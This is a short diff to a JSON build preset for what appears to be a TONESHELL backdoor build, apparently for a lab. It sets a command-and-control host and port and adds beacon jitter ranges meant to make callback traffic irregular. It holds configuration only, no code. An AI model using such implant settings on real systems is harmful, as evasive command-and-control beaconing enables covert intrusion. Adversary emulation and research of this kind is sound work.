@@ -26,7 +26,11 @@
           "AL_TESTS": "OFF",
           "TONESHELL_LOG_DIR": "C:/Windows/Temp",
           "TONESHELL_C2_HOST": "192.168.56.2",
-          "TONESHELL_C2_PORT": "8443"
+          "TONESHELL_C2_PORT": "8443",
+          "TONESHELL_JITTER_ACTIVE_MIN_MS": "1000",
+          "TONESHELL_JITTER_ACTIVE_MAX_MS": "3000",
+          "TONESHELL_JITTER_IDLE_MIN_MS": "5000",
+          "TONESHELL_JITTER_IDLE_MAX_MS": "30000"
         },
         "condition": {
           "type": "equals",
